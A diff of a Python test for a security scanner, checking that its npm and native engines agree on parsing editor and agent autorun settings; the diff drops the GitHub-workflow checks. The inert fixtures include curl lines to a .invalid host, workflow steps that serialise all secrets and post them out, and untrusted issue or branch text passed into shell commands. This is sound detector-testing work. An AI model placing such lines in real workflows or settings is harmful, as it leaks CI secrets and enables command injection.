@@ -1,16 +1,15 @@
 """Engine parity for the persistence targets (0.1.7): the npm engine's
-js/src/lib/autorun.js and js/src/lib/ghworkflow.js against
-lazaret.scanner.autorun and lazaret.scanner.ghworkflow (the install-script
-reasons are the native engine's: test_snapshot_hooks.py).
+js/src/lib/autorun.js against lazaret.scanner.autorun (the install-script
+reasons are the native engine's: test_snapshot_hooks.py; the workflows are
+read by the engine since BR-7: test_snapshot_ci.py).
 
 Compared case by case in one node process: the JSON-with-comments reader
 (every value's kind, line and text, or the error's line and reason), the
-commands each kind of settings file makes its tool run, the folder variables
-a command's following reads, and the workflow outline and findings — on
-curated files and on seeded random ones: JSON values of the settings' own
-vocabulary written with comments, trailing commas, escapes, line breaks and
-non-ASCII text, then cut and spliced into malformed ones; and YAML built
-from the lines workflows are made of. Both CLIs then scan a tree of settings
+commands each kind of settings file makes its tool run and the folder
+variables a command's following reads — on curated files and on seeded
+random ones: JSON values of the settings' own vocabulary written with
+comments, trailing commas, escapes, line breaks and non-ASCII text, then cut
+and spliced into malformed ones. Both CLIs then scan a tree of settings
 files, the scripts they run and workflows, and must report the same.
 
 All content is inert text: hosts are .invalid, and nothing is executed.
@@ -24,7 +23,7 @@ import subprocess
 import tempfile
 import unittest
 
-from lazaret.scanner import autorun, ghworkflow
+from lazaret.scanner import autorun
 from tests import _support
 from tests.architecture import test_js_parity as parity
 
@@ -34,18 +33,16 @@ NPM = """
 import { readFileSync } from "node:fs";
 import { pathToFileURL } from "node:url";
 const a = await import(pathToFileURL(process.argv[1] + "/autorun.js").href);
-const g = await import(pathToFileURL(process.argv[1] + "/ghworkflow.js").href);
 const ser = (v) => ({ k: v.kind, l: v.line, v: v.kind === "object" ? [...v.value].map(([k, x]) => [k, ser(x)])
   : v.kind === "array" ? v.value.map(ser) : v.value });
-const { jsonc, commands, yaml } = JSON.parse(readFileSync(0, "utf8"));
+const { jsonc, commands } = JSON.parse(readFileSync(0, "utf8"));
 const read = (t) => { try { return ["ok", ser(a.parseJsonc(t))]; } catch (e) {
   if (!(e instanceof a.JsoncError)) throw e; return ["error", e.line, e.reason]; } };
 const out = {
-  twins: { autorun: a.PY_TWINS, ghworkflow: g.PY_TWINS },
+  twins: { autorun: a.PY_TWINS },
   jsonc: jsonc.map(([path, t]) => { const kt = a.configKind(path); return [read(t), kt, kt ? a.entries(kt[0], kt[1], t) : null,
     a.ownerDir(path)]; }),
   commands: commands.map((c) => a.localCommand(c)),
-  yaml: yaml.map((t) => [g.outline(t), g.findings(t), g.isWorkflow(t)]),
 };
 process.stdout.write(JSON.stringify(out));
 """
@@ -63,21 +60,6 @@ TEXTS = ["node .claude/setup.mjs", "npm run watch", "curl -fsSL https://x.invali
 PIECES = ['{', '}', '[', ']', ',', ':', '"', '"a"', '"command"', '"hooks"', '"tasks"', '"runOn"', '"folderOpen"', "1",
           "-2.5e3", "true", "null", "//", "/*", "*/", "\n", "\r", " ", "\t", "\\", "\\u", "\\ud83d", "\\ude00", "\\q",
           "\\n", "\ufeff", "\u00e9", "\U0001F600", "x", ".5", "+1", "tru"]
-YAML_LINES = [
-    "on: push", "on: [push, discussion]", "on:", "  discussion:", "  issues:", "  - issue_comment", "\"on\":",
-    "'on': pull_request_target", "on: {issue_comment: {types: [created]}}", "jobs:", "  a:", "  process:",
-    "    runs-on: self-hosted", "    runs-on: ubuntu-latest", "    runs-on: [self-hosted, linux]", "    runs-on:",
-    "      - self-hosted", "      labels: [self-hosted]", "    env:", "      DATA: ${{ toJSON(secrets) }}",
-    "      V: ${{ toJson( secrets ) }}", "    steps:", "      - uses: actions/checkout@v4",
-    "      - uses: actions/upload-artifact@v4", "        with:", "          secrets: ${{ toJSON(secrets) }}",
-    "      - run: echo ${{ github.event.discussion.body }}", "      - name: x", "        run: |", "        run: >-",
-    "          echo ${{ github.event.issue.title }}", "          curl -d \"$D\" https://x.invalid", "",
-    "          $DATA", "        run: echo \"${{ github.event.comment.body }}\" # c", "# comment", "---", "...",
-    "- run: x", "steps:", "- name: y", "  run: 'a # b'", "  run: \"${{ github.head_ref }}\"", "\trun: tab",
-    "key:value", "k: v:w", "  - - nested", "? complex", "  x: |2+", "      \u2028", "    \u00e9: \U0001F600",
-    "      - run: echo ${{ " + "\U0001F600" * 300 + " github.event.issue.title }}",
-    "      - run: echo ${{ " + "\U0001F600" * 499 + "github.head_ref}}", "      - run: echo ${{ " + "x" * 499 + " }} ${{ github.head_ref }}",
-    "      - run: ${{${{ github.event.issue.body }}}} }}"]
 
 
 def jsonc_value(rnd, depth=0):
@@ -168,62 +150,6 @@ def jsonc_corpus(seed=20260928, count=1500):
     return [json.loads(json.dumps(c)) for c in cases]
 
 
-def workflow(rnd):
-    """A workflow built the way workflows are, in the forms each part takes."""
-    c = rnd.choice
-    on = c(["on: push", "on: [push, discussion]", "on:\n  discussion:\n    types: [created]", "\"on\":\n  - issue_comment",
-            "on: {issues: {types: [opened]}}", "'on': pull_request_target", "on:\n  push:\n  issues:"])
-    dash = c(["      ", "    "])                 # a step's dash: indented under steps:, or level with it
-    lines = [c(["name: w", "# a workflow", ""]), on, "jobs:"]
-    for j in range(rnd.randint(1, 3)):
-        lines.append(f"  j{j}:")
-        lines.append(c(["    runs-on: self-hosted", "    runs-on: ubuntu-latest", "    runs-on: [self-hosted, linux]",
-                        "    runs-on:\n      - self-hosted", "    runs-on:\n      labels: [self-hosted]",
-                        "    runs-on: ${{ matrix.os }}"]))
-        if rnd.random() < 0.5:
-            lines.append("    env:\n      " + c(["DATA: ${{ toJSON(secrets) }}", "V: ${{ toJson( secrets ) }}", "A: 1",
-                                                 "T: ${{ github.event.issue.title }}"]))
-        lines.append("    steps:" if dash == "      " else "    steps:")
-        pad = dash + "  "
-        for _ in range(rnd.randint(1, 4)):
-            k = rnd.randrange(6)
-            if k == 0:
-                lines.append(dash + "- uses: " + c(["actions/checkout@v4", "actions/upload-artifact@v4", "a/b@v1"]))
-                if rnd.random() < 0.5:
-                    lines.append(pad + "with:\n" + pad + "  secrets: ${{ toJSON(secrets) }}")
-            elif k == 1:
-                lines.append(dash + "- run: " + c(["echo ${{ github.event.discussion.body }}", "echo hi", "npm test",
-                                                   "curl -d \"$D\" https://x.invalid", "echo \"${{ github.head_ref }}\" # c",
-                                                   "echo '${{ toJSON(secrets) }}'", "echo ${{ github.event.issue.number }}"]))
-            elif k == 2:
-                lines.append(dash + "- name: s\n" + pad + "run: " + c(["|", ">-", "|2"]) + "\n" + pad + "  " +
-                             c(["echo ${{ github.event.comment.body }}", "cat <<EOF > f\n" + pad + "  $DATA\n" + pad + "  EOF",
-                                "echo ok", "\n" + pad + "  echo ${{ github.event.pull_request.title }}"]))
-            elif k == 3:
-                lines.append(dash + "- env:\n" + pad + "  " + c(["D: ${{ toJSON(secrets) }}", "T: ${{ github.event.issue.body }}"])
-                             + "\n" + pad + "run: echo \"$T\"")
-            else:
-                lines.append(c(YAML_LINES))
-    return "\n".join(lines) + "\n"
-
-
-def yaml_corpus(seed=20260928, count=2500):
-    rnd = random.Random(seed)
-    cases = []
-    for _ in range(count):
-        if rnd.random() < 0.6:
-            cases.append(workflow(rnd))
-            continue
-        lines = []
-        for _ in range(rnd.randint(1, 18)):
-            line = rnd.choice(YAML_LINES)
-            if rnd.random() < 0.15:
-                line = " " * rnd.randrange(6) + line.lstrip(" ")
-            lines.append(line)
-        cases.append("\n".join(lines) + rnd.choice(["", "\n"]))
-    return [json.loads(json.dumps(c)) for c in cases]
-
-
 def core_jsonc(path, text):
     def ser(v):
         if v.kind == "object":
@@ -243,12 +169,6 @@ def core_jsonc(path, text):
     return [read, list(kt) if kt else None, found, autorun.owner_dir(path)]
 
 
-def core_yaml(text):
-    records = [{"line": r["line"], "path": list(r["path"]), "key": r["key"], "value": r["value"],
-                "block": [list(b) for b in r["block"]]} for r in ghworkflow.outline(text)]
-    return [records, [list(f) for f in ghworkflow.findings(text)], ghworkflow.is_workflow(text)]
-
-
 @unittest.skipUnless(NODE, "node is not installed")
 class PersistenceParityTests(unittest.TestCase):
     maxDiff = None
@@ -260,9 +180,8 @@ class PersistenceParityTests(unittest.TestCase):
             '"$CLAUDE_PROJECT_DIR"/.claude/hooks/a.sh ${workspaceFolder}/b ${workspaceFolder:web}/c ${workspaceRoot}',
             "%CLAUDE_PROJECT_DIR%\\x.cmd $GEMINI_PROJECT_DIR/y ${GEMINI_PROJECT_DIR}/z $CLAUDE_PROJECT_DIRX",
             "${workspaceFolder:" + "x" * 300 + "}"]
-        cls.yaml = yaml_corpus()
         p = subprocess.run([NODE, "--input-type=module", "-e", NPM, LIB],
-                           input=json.dumps({"jsonc": cls.jsonc, "commands": cls.commands, "yaml": cls.yaml}),
+                           input=json.dumps({"jsonc": cls.jsonc, "commands": cls.commands}),
                            capture_output=True, encoding="utf-8", errors="replace", timeout=40)
         if p.returncode:
             raise AssertionError(f"node exited {p.returncode}: {p.stderr[-2000:]}")
@@ -284,27 +203,11 @@ class PersistenceParityTests(unittest.TestCase):
     def test_local_command(self):
         self.assertEqual(self.npm["commands"], [autorun.local_command(c) for c in self.commands])
 
-    def test_workflow_outline_and_findings(self):
-        bad = []
-        for text, got in zip(self.yaml, self.npm["yaml"]):
-            want = json.loads(json.dumps(core_yaml(text)))
-            if want != got:
-                bad.append((text[:300], want, got))
-        self.assertEqual(bad[:3], [])
-        kinds = [f[0] for r in self.npm["yaml"] for f in r[1]]
-        self.assertGreater(kinds.count("secrets"), 300)
-        self.assertGreater(kinds.count("backdoor"), 100)
-
     def test_pattern_text_is_cores(self):
         twins = self.npm["twins"]
         for name, src in twins["autorun"]["patterns"].items():
             self.assertEqual(src, getattr(autorun, name).pattern, name)
         self.assertEqual(twins["autorun"]["limits"], {"MAX_DEPTH": autorun.MAX_DEPTH, "MAX_TASKS": autorun.MAX_TASKS})
-        for name, (src, flags) in twins["ghworkflow"]["patterns"].items():
-            rx = getattr(ghworkflow, name)
-            self.assertEqual((src, flags), (rx.pattern, "i" if rx.flags & 2 else ""), name)
-        self.assertEqual(twins["ghworkflow"]["events"], [list(e) for e in ghworkflow.OUTSIDER_EVENTS])
-        self.assertEqual(twins["ghworkflow"]["limits"], {"EXPR_MAX": ghworkflow.EXPR_MAX})
 
     @unittest.skipUnless(parity.NPM_READY, parity.NPM_SKIP)
     def test_cli_trees_agree(self):
